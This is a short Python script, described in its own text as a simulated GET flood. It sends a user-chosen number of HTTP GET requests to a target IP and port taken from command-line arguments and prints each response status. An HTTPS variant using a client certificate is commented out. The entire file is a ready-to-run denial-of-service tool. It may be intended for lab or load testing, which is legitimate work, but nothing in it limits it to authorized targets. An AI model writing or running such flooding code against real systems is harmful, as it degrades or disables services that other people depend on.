#pip install httpx[http2]

import os
import requests
import time
import argparse
import httpx


def get_flood_attack(ip_dst, port_dst, count):
    url = "http://" + ip_dst + ":" + str(port_dst)
    print(f"Destination URL: {url}")
    '''
    if 'https' in http_type:
            if os.path.exists(key_file_path):
                if os.path.exists(crt_file_path):
                    client_cert_file = ('./certificate.crt', './private.key')
                    try:
                        with httpx.Client(http2=True) as client:
                            for i in range(0, count):
                                response = requests.get(url, cert=client_cert_file)
                                print(f"Status Code: {response.status_code}") 
                    except requests.exceptions.RequestException as e:
                        print(f"Error: {e}")
            else:
                print("Need private.key and certificate.crt file")
                exit(0)
        
    else: #http
    '''
    for i in range(0, count):
        try:
            response = requests.get(url) 
            print(f"No. {i} package, received {response.status_code} status code")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

    

def main():
    parser = argparse.ArgumentParser(description = "Simulate Get Flood")
    parser.add_argument('-ti', '--target_ip', help="Specify the target ip, e.g. 127.0.0.1", required=True)
    parser.add_argument('-tp', '--target_port', help="Specify the targrt's port", required=True)
    parser.add_argument('-c', '--count', help="Specify the number of packets that you want to send", required=True)
    #parser.add_argument('-ht', '--http_type', help="Specify protocol, e.g. http, https", required=True)

    args = parser.parse_args()
    ip_dst = args.target_ip
    port = int(args.target_port)
    #http_type = args.http_type
    count = int(args.count)

    get_flood_attack(ip_dst, port, count)



if __name__ == "__main__":
    main()

